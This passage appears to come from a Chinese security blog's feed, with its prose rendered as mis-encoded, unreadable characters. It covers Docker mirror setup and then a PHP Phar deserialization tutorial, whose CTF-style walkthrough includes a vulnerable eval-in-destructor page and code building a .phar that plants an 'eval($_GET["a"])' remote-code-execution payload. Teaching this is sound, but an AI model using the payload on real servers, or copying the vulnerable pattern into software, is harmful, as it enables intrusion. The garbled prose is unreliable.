class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>dockerå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹å·²æœ‰é•œåƒ</span><br>docker images<br><br><span class="hljs-comment"># æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br>docker ps<br><br><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨</span><br>docker ps -a<br><br><span class="hljs-comment"># æ„å»ºé•œåƒ</span><br>docker build -t é•œåƒåå­— .<br><br><span class="hljs-comment"># è¿è¡Œé•œåƒ</span><br>docker run -itd -p &lt;ä¸»æœºç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt; --name &lt;å®¹å™¨åå­—&gt; &lt;é•œåƒåå­—&gt;<br>å¦‚ï¼šdocker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;å®¹å™¨ID&gt; /bin/sh<br><br><span class="hljs-comment"># ä»¥ /bin/sh æƒé™è¿›å…¥å®¹å™¨äº¤äº’ç•Œé¢</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;å®¹å™¨ID&gt; /bin/sh<br><br><span class="hljs-comment"># å¯åŠ¨å®¹å™¨</span><br>docker start &lt;å®¹å™¨åæˆ–ID&gt;<br><br><span class="hljs-comment"># æš‚åœå®¹å™¨</span><br>docker stop &lt;å®¹å™¨åæˆ–ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒæ­å»º</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒæ­å»º</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pharååºåˆ—åŒ–</title>
    <link href="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯Phar"><a href="#ä»€ä¹ˆæ˜¯Phar" class="headerlink" title="ä»€ä¹ˆæ˜¯Phar"></a>ä»€ä¹ˆæ˜¯<code>Phar</code></h1><p>JAR æ˜¯å¼€å‘ Java ç¨‹åºä¸€ä¸ªåº”ç”¨ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„å¯æ‰§è¡Œã€å¯è®¿é—®çš„æ–‡ä»¶ï¼Œéƒ½æ‰“åŒ…è¿›äº†ä¸€ä¸ª JAR æ–‡ä»¶é‡Œï¼Œä½¿å¾—éƒ¨ç½²è¿‡ç¨‹ååˆ†ç®€å•</p><p><code>phar</code>æ˜¯ PHP é‡Œç±»ä¼¼äº JAR çš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œè¯´ç™½äº†å…¶æœ¬è´¨å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå‹ç¼©åŒ…</p><p>å¯¹äº PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œ<code>phar</code>åç¼€æ–‡ä»¶æ—¶é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨</p><p>ä¸€èˆ¬ä½¿ç”¨æ–‡ä»¶åŒ…å«ä¸­çš„**<code>phar</code>ä¼ªåè®®<strong>è¿›è¡Œè¯»å–</strong><code>.phar</code>æ–‡ä»¶**</p><h1 id="Pharæ–‡ä»¶ç»“æ„"><a href="#Pharæ–‡ä»¶ç»“æ„" class="headerlink" title="Pharæ–‡ä»¶ç»“æ„"></a><code>Phar</code>æ–‡ä»¶ç»“æ„</h1><ul><li>**<code>stub pharï¼š</code>**è¿™æ˜¯<code>phar</code>æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>ï¼ˆå¤´éƒ¨ä¿¡æ¯ï¼‰ï¼Œè¿™æ˜¯ PHAR æ–‡ä»¶çš„å…¥å£ç‚¹ï¼Œå½“ PHP è§£é‡Šå™¨åŠ è½½ PHAR æ–‡ä»¶æ—¶ï¼Œä¼šé¦–å…ˆæ‰§è¡Œ Stub ä»£ç </li><li><strong><code>manifestï¼š</code><strong>å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥</strong>åºåˆ—åŒ–</strong>æ–¹å¼å­˜å‚¨</li><li>**<code>contentsï¼š</code>**å‹ç¼©æ–‡ä»¶çš„å†…å®¹</li><li>**<code>signatureï¼š</code>**ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</li></ul><p><strong><code>phar</code>åè®®</strong>è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹**<code>manifest</code>å­—æ®µ<strong>çš„</strong>åºåˆ—åŒ–å­—ç¬¦ä¸²<strong>è¿›è¡Œ</strong>ååºåˆ—åŒ–**</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png" alt="image-20250420202950641"></p><p>ä»¥ä¸‹æ˜¯å®˜æ–¹æ–‡æ¡£ï¼Œçº¢æ¡†éƒ¨åˆ†æ˜¯è¦è¿›è¡Œåˆ©ç”¨çš„åºåˆ—åŒ–éƒ¨åˆ†</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420203104476.png" alt="image-20250420203104476"></p><p><strong><code>phar</code>æ–‡ä»¶çš„å‹ç¼©å’Œè§£å‹ç¼©</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># å‹ç¼©</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>Phar</code>ç±»ï¼š</strong><code>Phar</code>æ˜¯ PHP å†…ç½®çš„ä¸€ä¸ªç±»ï¼Œç”¨äºåˆ›å»ºã€æ“ä½œå’Œç®¡ç† PHAR æ–‡ä»¶</li><li>**<code>$phar = new Phar(&#39;test2.phar&#39;,0,&#39;test2.phar&#39;);</code>**ç¬¬ä¸€ä¸ªå‚æ•°<code>test2.phar</code>æ˜¯åˆ›å»ºçš„ PHAR æ–‡ä»¶åï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶å…è®¸è¿›è¡Œä¿®æ”¹ï¼Œä¼šå¯¹å…¶è¿›è¡Œæ›´æ–°ï¼›ç¬¬äºŒä¸ªå‚æ•°<code>0</code>è¡¨ç¤ºæ–‡ä»¶åˆ›å»ºçš„æ ‡å¿—ï¼Œå®é™…åº”ç”¨ä¸­ä¼šä½¿ç”¨å¦‚ï¼š<code>Phar::CREATE</code>è¡¨ç¤ºåˆ›å»ºæ–°çš„ PHAR æ–‡ä»¶ï¼Œæ¥æŒ‡å®šä¸åŒçš„åˆ›å»ºæ¨¡å¼ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°<code>test2.phar</code>æŒ‡å®š PHAR æ–‡ä»¶çš„åˆ«åï¼Œå¯ä»¥åœ¨åç»­ä¸­å¼•ç”¨è¯¥ PHAR æ–‡ä»¶æ—¶ä½¿ç”¨</li><li>**<code>$phar-&gt;buildfromDirectory(&#39;f:\0Day&#39;);</code>**æŒ‡å®šè¦æ‰“åŒ…çš„ç›®å½•è·¯å¾„</li><li>**<code>$phar-&gt;setDefaultStub(&#39;test.txt&#39;,&#39;test.txt&#39;);</code>**ä¸­<code>setDefaultStub</code>ç”¨äºä¸º PHAR æ–‡ä»¶è®¾ç½®é»˜è®¤çš„ Stubï¼Œå³é»˜è®¤å…¥å£ï¼›ç¬¬ä¸€ä¸ªå‚æ•°<code>test.txt</code>æ˜¯å…¥å£æ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•° <code>&#39;test.txt&#39;</code> æ˜¯å†…éƒ¨æ–‡ä»¶çš„è·¯å¾„</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># è§£å‹ç¼©</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>**<code>$phar = new Phar(&#39;test.phar&#39;);</code>**é€šè¿‡ <code>new Phar(&#39;test.phar&#39;)</code> è¯­å¥ï¼Œç¨‹åºå°è¯•æ‰“å¼€åä¸º <code>test.phar</code> çš„ Phar å‹ç¼©åŒ…æ–‡ä»¶ï¼Œå¹¶å°†å…¶å°è£…æˆä¸€ä¸ª <code>Phar</code> å¯¹è±¡å­˜å‚¨åœ¨å˜é‡ <code>$phar</code> ä¸­ã€‚å¦‚æœ <code>test.phar</code> æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼šæŠ¥é”™</li><li>**<code>$phar-&gt;extractTo(&#39;test&#39;);</code>**è°ƒç”¨ <code>Phar</code> å¯¹è±¡çš„ <code>extractTo</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯å°† Phar å‹ç¼©åŒ…ä¸­çš„æ‰€æœ‰å†…å®¹æå–åˆ°æŒ‡å®šçš„ç›®å½•ï¼›å‚æ•° <code>&#39;test&#39;</code> æ˜¯ç›®æ ‡ç›®å½•ï¼Œå³ Phar å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶å’Œç›®å½•ä¼šè¢«è§£å‹åˆ°åä¸º <code>test</code> çš„ç›®å½•ä¸‹ã€‚å¦‚æœè¯¥ç›®å½•ä¸å­˜åœ¨ï¼ŒPHP ä¼šå°è¯•åˆ›å»ºå®ƒï¼›è‹¥å·²å­˜åœ¨ï¼Œåˆ™ä¼šå°†æ–‡ä»¶è§£å‹åˆ°è¯¥ç›®å½•å†…</li></ul><h2 id="åˆ›å»ºä¸€ä¸ª-pharæ–‡ä»¶çš„æ¨¡æ¿"><a href="#åˆ›å»ºä¸€ä¸ª-pharæ–‡ä»¶çš„æ¨¡æ¿" class="headerlink" title="åˆ›å»ºä¸€ä¸ª.pharæ–‡ä»¶çš„æ¨¡æ¿"></a>åˆ›å»ºä¸€ä¸ª<code>.phar</code>æ–‡ä»¶çš„æ¨¡æ¿</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…·ä½“è§£æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥ .phar ä¸ºåç¼€</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># å¼€å§‹å†™æ–‡ä»¶</span><br><span class="hljs-comment"># è°ƒç”¨startBuffering()è¿™ä¸ªå‡½æ•°æ„å‘³ç€åç»­çš„å†™å…¥æ“ä½œä¸ä¼šç«‹å³å°†æ•°æ®å†™å…¥æ–‡ä»¶ï¼Œè€Œæ˜¯å…ˆå­˜å‚¨åœ¨ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°è°ƒç”¨stopBuffering()æ–¹æ³•</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># å†™å…¥stubï¼ˆæ˜¯ Phar æ–‡ä»¶çš„å…¥å£ç‚¹ï¼Œå½“ Phar æ–‡ä»¶è¢«æ‰§è¡Œæ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œ stub ä¸­çš„ä»£ç ï¼‰</span><br><span class="hljs-comment"># æ‹¬å·ä¸­çš„ä»£ç æ˜¯é»˜è®¤çš„ï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ PHP æŒ‡ä»¤ï¼Œç”¨äºåœæ­¢ PHP ä»£ç çš„ç¼–è¯‘ï¼Œåé¢çš„æ•°æ®ä¼šè¢«å½“ä½œäºŒè¿›åˆ¶æ•°æ®å¤„ç†</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># è¦å†™å…¥æ–‡ä»¶ä¸­çš„éƒ¨åˆ†</span><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª Testobj ç±»çš„å¯¹è±¡ $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># è®¾ç½®outputå±æ€§çš„å†…å®¹</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-comment"># è°ƒç”¨ setMetadata æ–¹æ³•ï¼Œå°† $o å¯¹è±¡ä½œä¸ºå…ƒæ•°æ®å†™å…¥ Phar æ–‡ä»¶ä¸­ï¼ˆå†™å…¥meta-dataï¼‰</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># å°†å­—ç¬¦ä¸² &quot;test&quot; ä½œä¸ºæ–‡ä»¶å†…å®¹ï¼Œä»¥ test.txt ä¸ºæ–‡ä»¶åæ·»åŠ åˆ° Phar å‹ç¼©åŒ…ä¸­</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># åœæ­¢å†™å…¥æ–‡ä»¶</span><br><span class="hljs-comment"># è°ƒç”¨ stopBuffering æ–¹æ³•ï¼Œåœæ­¢ç¼“å†²ï¼Œå¹¶å°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥åˆ° test.phar æ–‡ä»¶ä¸­</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Pharååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#Pharååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="Pharååºåˆ—åŒ–æ¼æ´åŸç†"></a><code>Phar</code>ååºåˆ—åŒ–æ¼æ´åŸç†</h1><p><code>manifest</code>å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨ï¼Œå­˜åœ¨ä¸€æ®µåºåˆ—åŒ–çš„å­—ç¬¦ä¸²</p><p>è°ƒç”¨<code>phar</code>ä¼ªåè®®ï¼Œå¯è¯»å–<code>.phar</code>æ–‡ä»¶</p><p><code>phar</code>åè®®è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹<code>manifest</code>å­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–</p><p><code>phar</code>éœ€è¦æ»¡è¶³ PHP &gt;&#x3D; 5.2ï¼Œåœ¨<code>php.ini</code>ä¸­å°†<code>phar.readonly</code>è®¾ä¸º<code>Off</code></p><p>ä»¥ä¸‹æ˜¯è¿™ä¸ªæ¼æ´å—åˆ°å½±å“çš„å‡½æ•°ï¼ˆå³å¯ä»¥ä½¿ç”¨<code>phar</code>ä¼ªåè®®è¯»å–<code>.phar</code>æ–‡ä»¶çš„å‡½æ•°ï¼‰</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175359494.png" alt="image-20250421175359494"></p><h3 id="å…·ä½“é¢˜ç›®è§£æ"><a href="#å…·ä½“é¢˜ç›®è§£æ" class="headerlink" title="å…·ä½“é¢˜ç›®è§£æ"></a>å…·ä½“é¢˜ç›®è§£æ</h3><p>ç¬¬ä¸€ä¸ªæ˜¯æ¼æ´é¡µé¢<code>index.php</code>ï¼Œæºç å¦‚ä¸‹</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175611356.png" alt="image-20250421175611356"></p><p>ç¬¬äºŒä¸ªæ˜¯å¯ä»¥ç”Ÿæˆ<code>phar</code>æ–‡ä»¶çš„é¡µé¢<code>phar.php</code>ï¼Œæºç å¦‚ä¸‹</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175706263.png" alt="image-20250421175706263"></p><p><strong>å®¡è®¡ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&quot;echo &#x27;ok&#x27;;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>åœ¨æ¼æ´é¡µé¢<code>index.php</code>çš„æºç ä¸­ï¼Œå®šä¹‰äº†<code>Testobj</code>è¿™ä¸ªç±»ï¼Œæœ‰ä¸€ä¸ªå±æ€§<code>output</code>ï¼Œå’Œä¸€ä¸ª<code>__destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œä¼šæ‰§è¡Œ<code>output</code>çš„å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥è¿›è¡ŒRCEæ‰§è¡Œå‘½ä»¤</li><li>ç„¶åæ˜¯å¯ä»¥GETä¼ å‚<code>filename</code>ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>file_exists()</code>å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªå‡½æ•°å­˜åœ¨ä¸å—å½±å“çš„å‡½æ•°ä¹‹ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨<code>phar</code>ååºåˆ—åŒ–æ¼æ´</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥ .phar ä¸ºåç¼€</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># å¼€å§‹å†™æ–‡ä»¶</span><br><span class="hljs-comment"># è°ƒç”¨startBuffering()è¿™ä¸ªå‡½æ•°æ„å‘³ç€åç»­çš„å†™å…¥æ“ä½œä¸ä¼šç«‹å³å°†æ•°æ®å†™å…¥æ–‡ä»¶ï¼Œè€Œæ˜¯å…ˆå­˜å‚¨åœ¨ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°è°ƒç”¨stopBuffering()æ–¹æ³•</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># å†™å…¥stubï¼ˆæ˜¯ Phar æ–‡ä»¶çš„å…¥å£ç‚¹ï¼Œå½“ Phar æ–‡ä»¶è¢«æ‰§è¡Œæ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œ stub ä¸­çš„ä»£ç ï¼‰</span><br><span class="hljs-comment"># æ‹¬å·ä¸­çš„ä»£ç æ˜¯é»˜è®¤çš„ï¼Œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ PHP æŒ‡ä»¤ï¼Œç”¨äºåœæ­¢ PHP ä»£ç çš„ç¼–è¯‘ï¼Œåé¢çš„æ•°æ®ä¼šè¢«å½“ä½œäºŒè¿›åˆ¶æ•°æ®å¤„ç†</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª Testobj ç±»çš„å¯¹è±¡ $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># è®¾ç½®outputå±æ€§çš„å†…å®¹</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-comment"># è°ƒç”¨ setMetadata æ–¹æ³•ï¼Œå°† $o å¯¹è±¡ä½œä¸ºå…ƒæ•°æ®å†™å…¥ Phar æ–‡ä»¶ä¸­ï¼ˆå†™å…¥meta-dataï¼‰</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># å°†å­—ç¬¦ä¸² &quot;test&quot; 